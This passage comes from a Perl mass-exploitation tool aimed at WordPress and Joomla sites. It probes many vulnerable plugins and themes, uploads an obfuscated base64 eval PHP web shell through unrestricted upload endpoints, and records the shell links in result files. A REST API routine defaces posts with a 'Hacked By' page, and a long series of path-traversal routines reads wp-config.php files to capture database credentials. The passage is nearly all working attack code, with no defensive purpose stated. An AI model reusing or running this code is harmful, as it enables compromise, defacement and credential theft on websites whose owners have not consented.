my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["Xploit.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Reflex Gallery";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $reflexup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$reflexup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Reflex Gallery";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ b2jcontact #####################
sub b2j(){

my @filesz = ('/kontakty','iletisim','contatti.html','contact-us','contact-us.html','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
my $checkfoxupx = $ua->get("$url")->content;
if($checkfoxupx =~/b2j/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," ........................";
print color('bold green'),"VULN\n";
print color('bold red'), "Testing Vuln $url \n";
    print color('reset');
	my $regex='" name="cid_(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Bid no: $1\n";
		my $bid = $1;
		my $izo = $site . 'index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../Xploit.php';
		    print color('reset');
my $index='
<?php eval (base64_decode("ZWNobyAnPHRpdGxlPlNlY1hwbG9pdCB2MS4wIDwvdGl0bGU+JzsKZWNobyAnPGNlbnRlcj48aDE+U2VjWHBsb2l0IFVwbG9hZGVyPC9oMT48Y2VudGVyPic7CmlmKCRfR0VUWydYJ109PSJYcGxvaXQiKXsKZWNobyAiPGNlbnRlcj48Yj5VbmFtZToiLnBocF91bmFtZSgpLiI8L2I+IjsgCmVjaG8gJzxmb250IGNvbG9yPSJibGFjayIgc2l6ZT0iNCI+JzsKaWYoaXNzZXQoJF9QT1NUWydTdWJtaXQnXSkpewogICAgJGZpbGVkaXIgPSAiIjsgCiAgICAkbWF4ZmlsZSA9ICcyMDAwMDAwJzsKICAgICRtb2RlID0gJzA2NDQnOwogICAgJHVzZXJmaWxlX25hbWUgPSAkX0ZJTEVTWydpbWFnZSddWyduYW1lJ107CiAgICAkdXNlcmZpbGVfdG1wID0gJF9GSUxFU1snaW1hZ2UnXVsndG1wX25hbWUnXTsKICAgIGlmKGlzc2V0KCRfRklMRVNbJ2ltYWdlJ11bJ25hbWUnXSkpIHsKICAgICAgICAkcXggPSAkZmlsZWRpci4kdXNlcmZpbGVfbmFtZTsKICAgICAgICBAbW92ZV91cGxvYWRlZF9maWxlKCR1c2VyZmlsZV90bXAsICRxeCk7CiAgICAgICAgQGNobW9kICgkcXgsIG9jdGRlYygkbW9kZSkpOwplY2hvIiA8YSBocmVmPSR1c2VyZmlsZV9uYW1lPjxjZW50ZXI+PGI+U3VjZXNzIFVwbG9hZCAhISEgPT0+ICR1c2VyZmlsZV9uYW1lPC9iPjwvY2VudGVyPjwvYT4iOwp9Cn0KZWxzZXsKZWNobyc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKfQplY2hvICc8L2NlbnRlcj48L2ZvbnQ+JzsKfQ")); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/Xploit.php")->content;
if ($checkfoxupx =~ /X Xploit/) {	
print color('bold red'),"Shell Uploaded Successfully\n";
print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/Xploit.php\n";
		    print color('reset');
open (TEXT, '>>Result/shell.txt');
print TEXT "$site/components/com_b2jcontact/uploads/Xploit.php\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," ....................... ";
print color('bold red'),"NOT VULN\n";			
}
}
}
}
}
}
sub b22j(){

my @filesz = ('/index.php/contact','/index.php/contact/adres','/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos','contact-us');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
	print colored ("[ Scanning B2J]",'white on_blue'),$url."\n";
my $cms = $ua->get("$url")->content;
if($cms =~/b2j/) {
    print color("bold red"), "Joomla B2jcontact Found\n";
print color('bold red'), "Testing Vuln $url - \n";
    print color('reset');
    my $regex='name="b2jmoduleid_(.*?)"';
    if($cms =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($cms =~ s/$regex//){
	my $bid = $1;
    print color("bold red"), "Bid no: $1\n";
}	
my @filesx = ('/index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../Xploit.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Xploit.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid='.$bid.'&id='.$out.'&Itemid='.$out.'&qqfile=586cfc73826e4-/../Xploit.php','/index.php/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Xploit.php','/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Xploit.php','index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Xploit.php','/index.php/contact/loader/component/'.$out.'/components/b2jcontact/1&qqfile=586cfc73826e4-/../Xploit.php');
OUTER: foreach my $vulx(@filesx){
 my $izo = $site . $vulx; 
		print color('reset');		
my $index='
<?php eval (base64_decode("ZWNobyAnPHRpdGxlPlNlY1hwbG9pdCB2MS4wIDwvdGl0bGU+JzsKZWNobyAnPGNlbnRlcj48aDE+U2VjWHBsb2l0IFVwbG9hZGVyPC9oMT48Y2VudGVyPic7CmlmKCRfR0VUWydYJ109PSJYcGxvaXQiKXsKZWNobyAiPGNlbnRlcj48Yj5VbmFtZToiLnBocF91bmFtZSgpLiI8L2I+IjsgCmVjaG8gJzxmb250IGNvbG9yPSJibGFjayIgc2l6ZT0iNCI+JzsKaWYoaXNzZXQoJF9QT1NUWydTdWJtaXQnXSkpewogICAgJGZpbGVkaXIgPSAiIjsgCiAgICAkbWF4ZmlsZSA9ICcyMDAwMDAwJzsKICAgICRtb2RlID0gJzA2NDQnOwogICAgJHVzZXJmaWxlX25hbWUgPSAkX0ZJTEVTWydpbWFnZSddWyduYW1lJ107CiAgICAkdXNlcmZpbGVfdG1wID0gJF9GSUxFU1snaW1hZ2UnXVsndG1wX25hbWUnXTsKICAgIGlmKGlzc2V0KCRfRklMRVNbJ2ltYWdlJ11bJ25hbWUnXSkpIHsKICAgICAgICAkcXggPSAkZmlsZWRpci4kdXNlcmZpbGVfbmFtZTsKICAgICAgICBAbW92ZV91cGxvYWRlZF9maWxlKCR1c2VyZmlsZV90bXAsICRxeCk7CiAgICAgICAgQGNobW9kICgkcXgsIG9jdGRlYygkbW9kZSkpOwplY2hvIiA8YSBocmVmPSR1c2VyZmlsZV9uYW1lPjxjZW50ZXI+PGI+U3VjZXNzIFVwbG9hZCAhISEgPT0+ICR1c2VyZmlsZV9uYW1lPC9iPjwvY2VudGVyPjwvYT4iOwp9Cn0KZWxzZXsKZWNobyc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKfQplY2hvICc8L2NlbnRlcj48L2ZvbnQ+JzsKfQ")); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
		print color('bold red'),"waiting...\n";
		}
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/izoc.php")->content;
if ($checkfoxupx =~ /X Xploit/) {	
print color('bold red'),"Shell Uploaded Successfully\n";
print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/izoc.php\n";
		    print color('reset');
open (TEXT, '>>Result/shell.txt');
print TEXT "$site/components/com_b2jcontact/uploads/izoc.php\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," ....................... ";
print color('bold red'),"NOT VULN\n";			
}
}
}
}
}
#############################################
sub developertools(){ 
my $url = "$site/wp-content/plugins/developer-tools/libs/swfupload/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'UPLOADDIR'=>'../', 'ADMINEMAIL'=>'test@example.com', 'Filedata' => ["Xploit.php"]]);

$zoomerup="$site//wp-content/plugins/developer-tools/libs/Xploit.php?";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," ................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup?X=Xploit\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," ................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}
#############################################
sub genesissimple(){ 
my $url = "$site/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'upload-favicon'=>'fake', 'iconImage' => ["Xploit.php"]]);

$zoomerup="$site//wp-content/uploads/favicon/Xploit.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," .................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup?X=Xploit\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," .................... ";
print color('bold red'),"NOT VULN";
print color('bold white'),"\n";
}
}

################ joom plugin #####################
sub simpleplugin(){ 
my $url = "$site/administrator/components/com_simplephotogallery/lib/uploadFile.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['uploadfile' => ["Xploit.php"], "jpath" => "..%2F..%2F..%2F..%2F" ]);

if ($response->content =~ /Xploit(.*?)php/) {
$uploadfolder=$1.'php?';
}
$zoomerup="$site/Xploit'.$uploadfolder.'";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com_simplephotogallery";
print color('bold white')," .............. ";
print color('bold green'),"Done";
print color('bold white'),"\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $zoomerup?X=Xploit\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$zoomerup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com_simplephotogallery";
print color('bold white')," ............ ";
print color('red'),"NOT VULN";
print color('bold white'),"\n";
}
}
################ comsexycontactform 2 #####################
sub sexycontactform2(){
my $url = "$site/com_sexycontactform/fileupload/index.php";
my $shell ="Xploit.php";
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );

$sexyup="$site/com_sexycontactform/fileupload/files/Xploit.php";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com sexycontactform2";
print color('bold white')," ............... ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"   File Uploaded Successfully\n";
print color('bold white'),"   [LINK] => $sexyup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$sexyup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com sexycontactform2";
print color('bold white')," ............... ";
print color('red'),"NOT VULN\n";
}
}
################ Creative Contact Form #####################
sub sexycontactform(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/Xploit.php";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["Xploit.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Creative Contact Form";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $sexycontactup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$sexycontactup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Creative Contact Form";
print color('bold white')," ............. ";
print color('bold red'),"NOT VULN\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="Xploit.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/Xploit.php";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $wtffup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$wtffup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Work The Flow File Upload";
print color('bold white')," ......... ";
print color('bold red'),"NOT VULN\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="Xploit.gif";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]
           
            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/Xploit.gif";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/image\/gif/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"WP Job Manger";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $jobmangerup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"WP Job Manger";
print color('bold white')," ..................... ";
print color('bold red'),"NOT VULN\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="Xploit.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/Xploit.php";

if ($response->content =~ /{"files/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"PHP Event Calendar";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $phpevup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$phpevup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"PHP Event Calendar";
print color('bold white')," ................ ";
print color('bold red'),"NOT VULN\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="Xploit.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/Xploit.php";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Synoptic";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $Synopticup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$Synopticup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Synoptic";
print color('bold white')," .......................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="Xploit.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/Xploit.php";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/X Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Wp Shop";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $wpshopup?X=Xploit\n";
open (TEXT, '>>Result/shell.txt');
print TEXT "$wpshopup?X=Xploit\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Wp Shop";
print color('bold white')," ........................... ";
print color('bold red'),"NOT VULN\n";
}
}

############### wpinjetc  ####################

sub wpinjetc(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wordpress Inject................... ";

$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';



$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



	
$defx="														<h2><center>Security Xploit Attacker <center></h2>
						</div>
						<div class=\"post_content\">
							<p></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By Ph.hitachi</b></font></div><br>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>Powered</font> By <font color=red>Xploit</font><br>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>thank you gassrini for the tool  <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b></p>
<p>
						</div>";
$file="Xploit.html";
$sirina=$id . 'justracccwdata';
$def=  $site . 'Xploit.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED By ph.hitachi', 'slug'=> $file,'content' => $defx];
$response = $ua->request($gassface);
$stat = $response->content;
	if ($stat =~ /Powered by Xploit/){
   print color('bold green');
print "[Succes]\n";
    print color('reset');
				    open(TEXT, '>>Result_v4/index.txt');  
    print TEXT "$def\n";  
    close(TEXT);
zoneh();

	}
else{
   print color('bold red');
print "NOT VULN\n";
    print color('reset');}
}
else{
   print color('bold red');
print "NOT VULN\n";
    print color('reset');}
}

####################################################################################################

sub acento(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Acento ............................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################

	
	
	
sub ajaxstore(){              print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"ajax-store-locator-wordpress_0 .... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
sub Antioch(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Antioch ........................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
sub Authentic(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Authentic ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
sub Churchope(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Churchope ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	
	
sub Epic(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Epic .............................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/epic/includes/download.php?file=wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
	
	
	
	
sub Felis(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Felis ............................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/felis/download.php?file=../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	

	
	
	
	
	
	
sub Force(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"Force-Download .................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/force-download.php?file=../wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	
	
	
	
	

	
	
sub FR0(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"FR0_theme ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/themes/FR0_theme/down.php?path=$site/wp-config.php";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print " VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
sub hbaudio(){
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
print color('bold white'),"hb-audio-gallery-lite ............. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
